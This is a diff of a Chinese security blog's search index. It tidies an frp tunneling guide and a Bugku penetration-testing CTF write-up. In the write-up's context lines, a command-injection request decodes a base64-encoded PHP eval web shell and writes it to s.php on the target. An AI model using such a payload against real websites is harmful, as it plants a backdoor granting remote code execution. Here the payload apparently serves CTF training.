@@ -465,7 +465,7 @@
 <p>windows 下启动 frpc 客户端：</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start</span> /b frpc.exe -c C:\\Users\\<span class="number">25189</span>\\Desktop\\frpc.ini</span><br></pre></td></tr></table></figure>
 
-<p>&#x3D;&#x3D;注意&#x3D;&#x3D;  这里 ini 文件一定要是 &#x3D;&#x3D;绝对路径&#x3D;&#x3D; ！！！不能是相对路径， 要先启动 frps 再启动 frpc</p>
+<p>注意 : 这里 ini 文件一定要是 &#x3D;&#x3D;绝对路径&#x3D;&#x3D; ！！！不能是相对路径， 要先启动 frps 再启动 frpc</p>
 <h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这玩意用起来很好用，看起来也不是很复杂，但还是要多去自己使用一下，我之前就是因为使用的是绝对路径导致一直不成功，卡了好久。</p>
 <p>还有就是配置文件不要写错了，我之前因为懒直接复制别人的配置文件内容，结果都后面才发现我根本就没有开启那个端口，所以也是一直连接不上。</p>
 <h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://frps.cn/11.html">Frp 官方文档介绍 – Frps.cn 中文文档</a></p>
@@ -473,7 +473,7 @@
 <p><a href="https://blog.csdn.net/qq_36981760/article/details/115713179">FRP搭建内网穿透(亲测有效)_locyan frp_Freguez · duoyu的博客-CSDN博客</a></p>
 ]]></content>
       <tags>
-        <tag>-tool</tag>
+        <tag>tool</tag>
       </tags>
   </entry>
   <entry>
@@ -1072,10 +1072,9 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/post/0.html</url>
-    <content><![CDATA[<p>title: 渗透测试3 Bugku<br>abbrlink: 17cccafb<br>date: 2023-05-07 19:38:26<br>tags:</p>
-<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/1.png" alt="1"></p>
+    <title>渗透测试3 Bugku</title>
+    <url>/post/17cccafb.html</url>
+    <content><![CDATA[<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/1.png" alt="1"></p>
 <h1 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h1><p>进去是一个站点，标题是模拟蜘蛛爬取</p>
 <p>随便输入一个网址就会跳转到那个网站</p>
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/2.png" alt="2"></p>
@@ -1139,5 +1138,8 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=echo &quot;PD9waHAgZXZhbCgkX1BPU1RbczFlbnRdKTs/Pg==&quot;|base64 -d&gt; s.php</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <tags>
+        <tag>-渗透测试</tag>
+      </tags>
   </entry>
 </search>
